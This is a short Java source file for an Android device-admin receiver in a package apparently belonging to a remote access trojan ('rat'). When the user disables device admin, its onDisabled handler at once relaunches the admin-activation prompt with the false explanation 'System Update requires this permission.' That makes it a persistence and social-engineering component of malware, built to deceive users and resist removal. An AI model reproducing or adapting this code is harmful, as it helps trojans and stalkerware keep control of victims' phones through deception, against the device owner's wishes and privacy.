package com.enterprise.rat.admin;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class AdminReceiver extends android.app.admin.DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d("AdminReceiver", "Device Admin activated");
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d("AdminReceiver", "Device Admin deactivated - attempting re-activation");
        try {
            Intent reactivate = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            reactivate.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                new ComponentName(context, AdminReceiver.class));
            reactivate.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "System Update requires this permission.");
            reactivate.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(reactivate);
        } catch (Exception e) {
            Log.e("AdminReceiver", "Failed to re-activate", e);
        }
    }
}
